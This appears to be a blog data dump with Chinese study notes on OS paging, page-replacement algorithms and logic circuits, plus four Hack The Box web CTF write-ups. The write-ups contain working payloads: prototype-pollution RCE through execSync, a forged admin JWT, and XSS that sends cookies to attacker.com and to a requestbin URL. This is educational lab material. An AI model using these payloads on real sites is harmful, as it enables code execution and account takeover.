Fragmentierung）：由于创建和释放内存块的动态变化，会在主存中产生空洞（Löcher）。即使总的空闲内存量是足够的，也可能没有一个足够大的连续内存区域来满足一个请求。这些空闲内存就被叫做外部碎片。 比如说使用Best-Fit策略，就会剩下来很多小的不连续的空闲块。 虚拟内存管理（Virtuelle Speicherverwaltung）一般情况下，进程的虚拟地址空间是大于实际可用的物理内存的。所以我们同样需要管理虚拟内存，以决定将哪些部分加载到（物理的实际）内存中。 最常用的实现方式便是分页（Paging）： 将虚拟地址空间被划分为页面（Seiten，Pages），内存（Hauptspeicher）被划分为物理页框（Kacheln，Frames）。通常每一页和每个页框的大小相同，或者至少页的大小是页框大小的倍数。 操作系统需要做的便是将页面映射到页框（Abbilden von Seiten auf Kacheln）。 这个映射具体由内存管理单元（Memory Management Unit，MMU）完成。 Paging中三个重要概念：（下面会详细讲） 页表（Page Table）： 负责管理虚拟页与物理页框之间的映射关系，操作系统为每个进程维护一张页表。 缺页异常（Seitenfehler，Page Fault）： 当访问一个尚未被加载到内存的虚拟页时，就会产生一个页错误（Page Fault），硬件会发出一个中断信号。操作系统响应这个中断，把缺失的页从磁盘加载到内存 页面换入（Seiteneinlagerung）： 如果内存已满，则需要将已有的页移出（换出）来腾出空间，被换出的页会被保存到硬盘中。 流程： 程序访问虚拟页 → 检查页表 → 若页不在内存 → 触发页错误（Page Fault） → OS 调入页面 → 若内存满 → 页面置换 → 更新页表 → 继续执行 硬件组件如之前提到的，内存管理单元（Memory Management Unit，MMU）负责完成地址的映射。 它的工作流程如图： CPU 发送虚拟地址（VA）给 MMU MMU 根据虚拟地址确定 Page Table Entry 的地址（PTEA） MMU 从缓存或内存中读取页表项（PTE） MMU 根据页表项计算出物理地址（PA） 缓存/内存将物理地址对应的数据（Daten）发送回 CPU 但这样会带来一个问题：由于页表通常存放在主存中，所以地址转换（Adressabbildung）的开销会非常大。 因此可以利用缓存（Cache）来改善这个问题：地址转换后备缓冲区（Translation Lookaside Buffer，TLB），它负责存储近期访问过的页表项（Page Table Entry）。 流程： CPU 发送虚拟地址 VA MMU 提取出虚拟页号 VPN，查询 TLB 如果 TLB 命中（TLB Hit），直接获得页表项（PTE） MMU 根据 PTE 生成物理地址（PA） 数据从物理内存中返回到 CPU 没有 Hit 的情况叫做 TLB Miss，会需要一次额外的内存访问来加载页表项（PTE）： 页表（Page Table）一个虚拟地址 v 会被解释为v=(s,w)，其中s表示页号（Seitenummer），w表示偏移量（Offset）。 每一页都对应一个页表项（1 Page-Table-Eintrag pro Seite），而这个页表项里会存储页框号（Frame-Nummer）。在转换地址时，s会被直接转换成页框号（Frame-Nummer），然后和w拼起来组成真正的物理地址。如图： 具体的转换过程可以看文章末尾的相关例题。 而页表中除了地址，还会存储附加信息，通过单个位（Bit）来表示： P（present）位：是否存在 表示对应的物理地址是否存在/有效 U/S（user/supervisor）位：用户/内核模式访问控制 指示是否只有操作系统内核（Betriebssystemkern）可以访问该页面 R（referenced）/ A（accessed）位：是否被访问过 只要这个页面被访问（zugegriffen），CPU就会自动设置这一位（为1）。 M（modify）/ Dirty Bit：是否被修改过 只要这页里有至少一个字节被写入（geschrieben），CPU就会自动设置这一位（为1）。 XD（execute-disable）位：禁止执行位 表示该页是否允许执行指令。属于保护措施。 多级页表（Mehrstufige Seitentabellen）如果虚拟地址空间很大，那么相应的页表（Page Table）也非常大，意味着将整个页表放入内存会占用大量内存资源。 所以需要引入多级页表结构，每一级页表只负责一部分地址空间，按需加载。 页错误（Seitenfehler，Page Fault）当程序访问一个虚拟地址时，如果该地址对应的页面不在内存中（即页表中的 P-Bit 未设置），就会发生页错误（Seitenfehler，Page Fault）。硬件会触发中断（Interrupt），交由操作系统处理，执行页错误处理器（Page-Fault-Handler）。 处理时分2种情况： 页面被换出（ausgelagert）： 查找是否有空闲页框（Kachel）： 有空闲：直接加载页面 无空闲：使用页面置换算法（Seitenersetzungsstrategien）释放空间 页面不存在也未被换出（nicht ausgelagert） 操作系统会触发内存保护错误（Speicherschutz-Fehler） 之后便会更新页表项（Page-Table-Eintrag）：设置P-Bit，清除R-Bit和M-Bit。 这些操作都完成之后便会恢复程序的状态。 目前这些转换地址的流程总结一下就是： 页面置换算法（Seitenersetzungsstrategien）替换页面的时候，我们有3个问题需要考虑：当内存满了，我们应该 在什么时候加载页面？ 针对这个问题我们有2种方法： 按需分页（On-Demand Paging）：页面只有在确实被访问到时，才会被加载到主存。 预取（Prefetching）：会提前加载页面以备不时之需。但这样一来又会回到一开始的问题，我们需要在提前多久加载哪些内容呢？ 将页面加载到哪里？ 所有页框（Kacheln）地位相同，一般不需要策略决定。但在实际中操作系统一般会对内核代码和内核数据做特殊处理，比如说恒等映射（Identity Mapping），即虚拟地址 = 物理地址。这样效率会高很多。 如果内存已经满了，我们该把现有的哪一页给换下去？ 这些正是我们下面会仔细讲的内容。 理论上最完美的算法当然是替换掉那个 下一次将被访问时间最晚 的页面。操作系统肯定是无法做到预知未来的，不过我们可以尝试往这个方向靠。 FIFO跟普通的First-in-First-Out一样，先替换掉最早来的。 例子： 缺点：在实际情况里大部分最早来的都是最重要的，所以之后大概率会多次访问，如果被替换下去了会一直触发Page Fault，开销会很大。 所以相比之下较常用的是它的改版：Second-Chance-Algorithmus。 Second-Chance-Algorithmus在FIFO的基础上，会给每页第二次机会。 页面被访问时会设置R-bit = 1。如果在队伍首则判断R-Bit的值，等于0就会被替换掉（如果M=1需要先执行写入操作然后再替换），等于1的话就给R-Bit的值更新成0然后挪到队伍尾。 图示： 缺点：每次都移动整个队列非常麻烦。 所以使用更高效的数据结构替代队列：Clock。 Clock-Algorithmus将所有页面按顺序组成一个环状列表（就像Clock一样），有一个“时钟指针”指向其中某个页面，表示当前检查的位置。这个指针用于寻找要替换的页面。 具体流程： 如果当前指向的页面的 R 位为 0： 替换这个页面为新页面 指针移动一格（顺时针） 如果 R 位为 1： 将 R 位清除（设为 0） 指针继续移动一格，检查下一个页面 重复 1-2 步骤： 直到找到一个 R 位为 0 的页面 这个页面会被替换 如果该页面的 M 位（Modified Bit）为 1： 将该页面内容写回磁盘 如果 M 位为 0： 直接丢弃该页面（因为它未被修改） 具体例子见文章结尾的例题。 Clock 例子： 假设现在需要进行这些操作： 那么：（每一步里被修改了的内容都用橙色标出来了的） Least Recently Used (LRU)因为程序的局部性原理（Lokalitätseigenschaft），我们可以假设过去经常使用的页面，未来也可能被再次使用。 当发生Page Fault时，替换掉那个“最长时间没被使用”的页面。 缺点：这个方法的实现需要一个双向链表，记录所有被访问页面，每次访问页面都要把它移到表头（意味着频繁更新），开销太大了，效率不高。 不过我们可以考虑使用软件近似模拟LRU（用“近似但效率更高”的方法来模拟 LRU 的行为趋势）：Not Frequently Used (NFU) 和 Aging。 LRU例子： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Not Frequently Used (NFU) 给每个页面 P 引入一个软件计数器 $A_p$ 固定大小，例如 b 位（bit），初始为 0 每次定时器中断（Timer-Interrupt）时： 操作系统检查所有页面的 R 位（被访问位） 如果某个页面 P 的 R 位被设置： 对应的计数器 $A_p$ 加 1 缺点：NFU并不知道“访问是否是最近的”，只知道总访问次数。比如说一个页面过去访问很多，但最近一直没被访问，NFU仍然会认为它很重要。 为了解决这个问题便需要Aging-Verfahren。 NFU 例子1： 页面编号：0, 1, 2, 3, 4 访问顺序（参考链）：0111221123324434 得到的计数器值：$A_0=1, A_1=5, A_2=4, A_3=3, A_4=3,$ NFU 例子2： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Aging-VerfahrenAging主要的思路是记录访问的“老化”程度（Erfassung der Alterung von Zugriffen）。 首先设置一个固定时间间隔 t（比如 20 毫秒）并记录哪些页面在这个间隔内被访问了。 同样会给每个页面 P 引入一个软件计数器 $A_p$。 每隔 t 的时间都会更新$A_p$： 将计数器向右移一位（shift） 把当前 R 位的值放到最高位 Aging 例子： 假设：Aging 计数器为 4 位（二进制），当前计数器 $A_p = 1100_2 = 12_{10}$，当前的引用位 R = 0。 那么新的 $A_p$ 会变成 $0110_2 = 6_{10}$ 。 当然，Aging也是有一定局限性的，但是我没看懂。（乐） Working-Set Ersetzungs-Verfahren前面这些策略全都是基于按需分页（Demand Paging）的，我们现在来看点不一样的。 首先，一个进程当前真正需要的那一批页面（Die Menge der Seiten, die ein Prozess aktuell benötigt）称为：工作集（Working Set）。而抖动（Setitenflattern，Thrashing）指的是当进程频繁地触发Page Fault。 在Working-Set-Modell中： 在任意时刻 t，工作集 w(k, t) 表示进程在最近的 k 次内存访问中访问到的页面集合。（从t往前数k个） 比如说给定一个访问序列：26157777516234123444344，并且将k设置为4，那么w(k, t1) = {3, 4}，w(8, t1) = {2, 3, 4}。 最简单的办法肯定是只替换不在当前工作集内的页面，但是每次都往前追踪k次访问带来的开销太大了。所以我们使用进程的执行时间（Rechenzeit）来近似。 需要先定义几个值： 执行时间区间 $\\tau$ 时间间隔 I（Clock Tick 间隔） 给每个进程设置一个单调递增的计数器 $Z$，用于近似进程的执行时间（Ausführungszeit /Rechenzeit)，实际使用CPU的时间） 给每一页 P 设置一个计数器 $Z_p$，用于近似上次访问的时间。 Working-Set Ersetzungs-Verfahren： 当发生页面错误时，操作系统会检查所有页的 R 位（R-Bits）： 如果R=1 für Seite P：页面属于 Working-Set，不会被替换，但是会将当前的 $Z_p$ 更新成 $Z$ 的值； 如果R=0 für Seite P： 如果$Z - Z_P &gt; \\tau$：P不属于Working-Set，会被替换掉； 如果$Z - Z_P \\leq \\tau$：虽然 P 在 I 这段时间里没有被使用过，但还是属于 Working-Set。 如果找到了多个符合条件的候选页：系统会选择 $Z_p$ 最小的那一页，称为 $P_{\\text{old}}$。 如果找不到任何页面可以换出（所有页面都还在 Working Set 中）：替换最老的页面（即 $P_{\\text{old}}$）。 缺点：实现起来非常复杂。 所以实际中会用 Working-Set Ansatz mit Clock-artiger Verwaltung der Seiten。 Working Set with Clockmalloc()Linux中的内存管理使用4级页表（4-stufige Pagetabelle）。 内存分配（Speicher-Allokation）： Buddy 分配器（Buddy-Allocator，基于之前讲的Buddy-Algorithm）：最小分配单位为页（page） 页面替换策略（Seitenersetzungsstrategie）： 使用 Swap 区：页不会立即被换出，而是暂存在 Swap 区 操作系统会保留一部分空闲帧（Frames），以便快速加载需要的页面 使用 Clock 替换算法的一个变种 作为页面替换策略 例题","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/en/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/en/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/en/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/en/tags/Ersetztungsstrategie/"}]},{"title":"HTB Gunship Writeup","slug":"CTF/Web/HTB-Gunship-Writeup","date":"2025-04-02T18:13:43.000Z","updated":"2025-04-02T21:31:57.706Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Gunship-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/CTF/Web/HTB-Gunship-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源码： 12345678910111213141516171819202122232425const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const pug = require(&#x27;pug&#x27;);const &#123; unflatten &#125; = require(&#x27;flat&#x27;);const router = express.Router();router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/submit&#x27;, (req, res) =&gt; &#123; const &#123; artist &#125; = unflatten(req.body); if (artist.name.includes(&#x27;Haigh&#x27;) || artist.name.includes(&#x27;Westaway&#x27;) || artist.name.includes(&#x27;Gingell&#x27;)) &#123; return res.json(&#123; &#x27;response&#x27;: pug.compile(&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;)(&#123; user: &#x27;guest&#x27; &#125;) &#125;); &#125; else &#123; return res.json(&#123; &#x27;response&#x27;: &#x27;Please provide us with the full name of an existing member.&#x27; &#125;); &#125;&#125;);module.exports = router; 发现它使用了 pug 模板引擎，是专门用来生成 HTML的。 使用Burpsuit抓包可以发现网页给 /api/submit 发送的是： 渗透这段代码里一开始引用的 unflatten() 正是漏洞所在。 （具体攻击原理参考 https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68） 将发送的内容改成（放到Repeater里修改了再发送）： 123456789&#123; &quot;artist.name&quot;: &quot;Haigh&quot;, &quot;__proto__&quot;: &#123; &quot;block&quot;: &#123; &quot;type&quot;: &quot;Text&quot;, &quot;line&quot;: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这个内容经过 unflatten() 的处理后会变成： 123456789&#123; artist: &#123; name: &quot;Haigh&quot; &#125;, __proto__: &#123; block: &#123; type: &quot;Text&quot;, line: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这里的__proto__ 会污染 所有对象的原型，让所有对象都拥有 .block 这个属性。 这段代码最终干的事情便是： 1cp /app/flag* /app/static/flag 会将flag的内容复制到 /app/static/flag 目录下，然后我们直接访问 1http://83.136.249.227:44133/static/flag 便可下载文件然后得到flag：HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/en/tags/RCE/"}]},{"title":"HTB WayWitch Writeup","slug":"CTF/Web/HTB-WayWitch-Writeup","date":"2025-04-02T16:03:54.000Z","updated":"2025-04-02T21:32:28.368Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 输入123试试，然后查看cookie： 因为cookie的内容为3部分，每2部分由 . 隔开的，所以是JWT，用 https://jwt.io/ 试试： 去给的附件里找找看有没有关于JWT的信息。 运气比较好，通过直接搜索 “JWT” 可以在 scr/views/index.html 里找到这部分内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061async function generateJWT() &#123; const existingToken = getCookie(&quot;session_token&quot;); if (existingToken) &#123; console.log(&quot;Session token already exists:&quot;, existingToken); return; &#125; const randomNumber = Math.floor(Math.random() * 10000); const guestUsername = &quot;guest_&quot; + randomNumber; const header = &#123; alg: &quot;HS256&quot;, typ: &quot;JWT&quot;, &#125;; const payload = &#123; username: guestUsername, iat: Math.floor(Date.now() / 1000), &#125;; const secretKey = await crypto.subtle.importKey( &quot;raw&quot;, new TextEncoder().encode(&quot;halloween-secret&quot;), &#123; name: &quot;HMAC&quot;, hash: &quot;SHA-256&quot; &#125;, false, [&quot;sign&quot;], ); const headerBase64 = btoa(JSON.stringify(header)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const payloadBase64 = btoa(JSON.stringify(payload)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const dataToSign = `$&#123;headerBase64&#125;.$&#123;payloadBase64&#125;`; const signatureArrayBuffer = await crypto.subtle.sign( &#123; name: &quot;HMAC&quot; &#125;, secretKey, new TextEncoder().encode(dataToSign), ); const signatureBase64 = btoa( String.fromCharCode.apply( null, new Uint8Array(signatureArrayBuffer), ), ) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const token = `$&#123;dataToSign&#125;.$&#123;signatureBase64&#125;`; document.cookie = `session_token=$&#123;token&#125;; path=/; max-age=$&#123;60 * 60 * 24&#125;; Secure`; console.log(&quot;Generated JWT Session Token:&quot;, token); &#125; 可以发现这里是把 halloween-secret 作为密钥进行签名的。继续阅读源码，可以在 scr/routes/index.js 里发现： 12345678910111213141516171819202122232425262728router.get(&quot;/tickets&quot;, async (req, res) =&gt; &#123; const sessionToken = req.cookies.session_token; if (!sessionToken) &#123; return res.status(401).json(response(&quot;No session token provided&quot;)); &#125; try &#123; const username = getUsernameFromToken(sessionToken); if (username === &quot;admin&quot;) &#123; try &#123; const tickets = await db.get_tickets(); return res.status(200).json(&#123; tickets &#125;); &#125; catch (err) &#123; return res .status(500) .json(response(&quot;Error fetching tickets: &quot; + err.message)); &#125; &#125; else &#123; return res .status(403) .json(response(&quot;Access denied. Admin privileges required.&quot;)); &#125; &#125; catch (err) &#123; return res.status(400).json(response(err.message)); &#125;&#125;); 也就是说 /tickets 页面只会验证我们的username是否等于admin。 并且flag就在这个页面里，因为对应的database的内容为： 1234567891011121314151617181920212223242526async migrate() &#123; let flag; fs.readFile(&quot;/flag.txt&quot;, &quot;utf8&quot;, function (err, data) &#123; flag = data; &#125;); await this.db.exec(` DROP TABLE IF EXISTS tickets; CREATE TABLE tickets( id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(255) NOT NULL, username VARCHAR(255) NOT NULL, content TEXT NOT NULL ); `); await this.db.exec(` INSERT INTO tickets (name, username, content) VALUES (&#x27;John Doe&#x27;, &#x27;guest_1234&#x27;, &#x27;I need help with my account.&#x27;), (&#x27;Jane Smith&#x27;, &#x27;guest_5678&#x27;, &#x27;There is an issue with my subscription.&#x27;), (&#x27;Admin&#x27;, &#x27;admin&#x27;, &#x27;Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter $&#123;flag&#125;&#x27;), (&#x27;Paul Blake&#x27;, &#x27;guest_9012&#x27;, &#x27;Can someone assist with resetting my password?&#x27;), (&#x27;Alice Cooper&#x27;, &#x27;guest_3456&#x27;, &#x27;The app crashes every time I try to upload a picture.&#x27;); `); &#125; 渗透首先确认一下这个密钥是否正确： 然后将username的值改为”admin”，再利用这个新的JWT访问 /tickets 。 这个网站不知道为什么突然不能修改jwt了，所以写段python手动修改： 1234567891011121314import jwtoriginal_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0XzE3ODgiLCJpYXQiOjE3NDM2MDk3MDd9.RrHUnCE8lcYjM0m2LZQDYM46uqrberxslMW_FNtm49s&quot;secret = &quot;halloween-secret&quot;algorithm = &quot;HS256&quot;decoded_payload = jwt.decode(original_token, secret, algorithms=[algorithm])decoded_payload[&quot;username&quot;] = &quot;admin&quot;new_token = jwt.encode(decoded_payload, secret, algorithm=algorithm)print(&quot;\\n新的 Token:&quot;)print(new_token) 得到flag：HTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/en/tags/JWT/"}]},{"title":"HTB Phantom Script Writeup","slug":"CTF/Web/HTB-Phantom-Script-Writeup","date":"2025-04-02T11:56:01.000Z","updated":"2025-04-02T21:32:11.467Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","excerpt":"","text":"题目描述 （有附件，但完全不需要。） 观察打开网页： 注意右边的这段代码： 123456789101112searchInput.addEventListener(&#x27;input&#x27;, function () &#123; const query = searchInput.value; if (query.trim() !== &quot;&quot;) &#123; const filteredArticles = filterArticles(query); searchResultsHeading.innerHTML = `Results for: &quot;$&#123;query&#125;&quot;`; searchResultsHeading.style.display = &#x27;block&#x27;; renderArticles(filteredArticles); &#125; else &#123; searchResultsHeading.style.display = &#x27;none&#x27;; renderArticles(articles); &#125;&#125;); 这里会直接提取我们的输入赋值给 query，并且将query直接拼接进HTML的代码里了。 网页右下角那里还给了些基础xss的例子： 但是尝试 1&lt;script&gt;alert(&#x27;Boo!&#x27;);&lt;/script&gt; 会失败，有可能是那里自动过滤了。 渗透尝试其他Payload即可： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 检测到注入成功了便会自动显示flag。 得到flag：HTB{xS5_iS_34SY_wh4t_d0_you_th1nk?} 。 讲一下这里注入成功的原理： 这是我们注入的内容： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 当我们在html里写 1&lt;img src=&quot;valid_image.jpg&quot;&gt; 的时候浏览器会自动去加载图片。但是我们这里故意写了个无效的地址1&lt;img src=x&gt; 所以加载时会触发error，然后 onerror 里的内容会被当作 JavaScript 执行。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/en/tags/JavaScript/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB OnlyHacks Writeup","slug":"CTF/Web/HTB-OnlyHacks-Writeup","date":"2025-04-02T07:38:35.000Z","updated":"2025-04-02T21:32:07.040Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 注册个账号试试：（注意这里一定要上传一个头像，不然会一直提示用户名重复） 进去之后会显示4个人，我们每个都点一下绿色的心（在dating app里应该是心动的意思）： 然后点进右上角的Mathces： 会发现只有一个对话框。 对话里没有什么有用的信息，但是我们注意到它好像是每隔一段时间（大概5到10秒左右）才会看一次我们的消息并回复，跟一般XSS的环境很像。 我们查看当前的cookie会发现： 通过base64解码会发现这个应该是通过cookie识别我们登录的身份的。（后面的乱码部分是python的flask的session自带的签名） 渗透通过XSS获取管理员身份并登录他的账号。 首先在 https://requestbin.kanbanbox.com/ 上创建一个RequestBin： 正常XSS攻击的模板是： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 所以我们将我们在RequestBin创建的url放进去然后在聊天框发送： 1&lt;script&gt;fetch(&quot;https://requestbin.kanbanbox.com/xckrydxc?cookie=&quot; + document.cookie); &lt;/script&gt; 之后在RequestBin页面点击右上角的青色图标那里： 就可以查看收到的cookie内容： 1eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE 之后在浏览器里修改我们的cookie再刷新网页： 可以看到我们成功登录了她的账号，还能看到我们刚才发送的消息。 flag就在另一个对话里：HTB{d0nt_trust_str4ng3r5_bl1ndly} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/en/tags/XSS/"}]},{"title":"逻辑电路图","slug":"TUM info 笔记/ERA/逻辑电路图","date":"2025-03-31T20:35:54.000Z","updated":"2026-02-05T09:38:29.293Z","comments":true,"path":"2025/03/31/TUM info 笔记/ERA/逻辑电路图/","permalink":"https://archer-baiyi.github.io/en/2025/03/31/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/","excerpt":"","text":"逻辑门先来认识（记）一下基础的逻辑门： 注意，NAND，NOR那里的那个小圆圈代表的是取反（negation），跟最底下的Negation是一个效果。 比如这里表达的是 $y = \\neg (a \\wedge \\neg b) $ ： 一般情况下堵在逻辑门出入口的圆圈指的是取反，而下面这种只是表示线路连接而已： 不要弄混了。 加法（Addition）半加器（Der Halbaddierer ，HA）半加器的目的是计算2个bit的加法，输出也为2个bit，即： 1234 a0+ b0------s1 s0 也可以用数学公式表达： \\begin{align*} ha: B^2 &\\to B^2 \\\\ (a_0,b_0) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0 \\end{align*}对应的真值表则是： \\begin{array}{cc|cc} a_0 & b_0 & s_1 & s_0 \\\\ \\hline 0 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 1 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 1 & 0 \\\\ \\end{array}也就是说 s_0 = a_0 \\text{ xor } b_0 s_1 = a_0 \\wedge b_0对应的逻辑电路图： 左边是and，右边是xor。在之后的内容里用HA指代半加器。 Kosten和Tiefe分别是：C(HA) = 2, Depth(HA) = 1。 全加器（Der Volladdierer ，FA）全加器的目的是计算3个bit的加法，输出为2个bit，即： 12345 a0+ b0+ c------s1 s0 其中c是进位信息。 对应的数学表达： \\begin{align*} fa: B^3 &\\to B^2 \\\\ (a_0,b_0,c) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0+c \\end{align*}真值表： \\begin{array}{ccc|cc} a_0 & b_0 & c & fa_1 & fa_0 \\\\ \\hline 0 & 0 & 0 & 0 & 0 \\\\ 0 & 0 & 1 & 0 & 1 \\\\ 0 & 1 & 0 & 0 & 1 \\\\ 0 & 1 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 0 & 1 \\\\ 1 & 0 & 1 & 1 & 0 \\\\ 1 & 1 & 0 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 1 \\\\ \\end{array}注意到： s_0 = a_0 \\text{ xor } b_0 \\text{ xor } c = ha_0(c,ha_0(a_0,b_0))\\\\ \\begin{align*} s_1 &= a_0 \\wedge b_0 \\vee c \\wedge (a_0 \\text{ xor } b_0 )\\\\ &= ha_1(a_0,b_0) + ha_1(c,ha_0(a_0,b_0)) \\end{align*}（ha0表示2个数相加得到的s0位的值，ha1同理。） 逻辑电路图： Kosten和Tiefe分别是：C(HA) = 5, Depth(HA) = 3。 选择器（Multiplexer，MUX）选择器正如字面意思，会从2个数里选择一个数。数学表达： \\begin{align*}sel_n: B^{2n+} &\\to B^{n} \\\\ (a_{n-1}, \\ldots, a_0, b_{n-1}, \\ldots, b_0, s) &\\mapsto \\begin{cases} (a_{n-1} \\ldots a_0), & \\text{falls } s = 1 \\\\ (b_{n-1} \\ldots b_0), & \\text{falls } s = 0 \\end{cases} \\end{align*}注意到： (sel_n)_i = (s \\wedge a_i) \\vee (\\neg s \\wedge b_i)逻辑电路图： 后续一般用这个符号指代： n-bit的选择器需要： 3n+1个门 深度为3 乘法 或者 存储（Speichern）假如说我们把一个门的输出再连回输入的口会发生什么呢？ 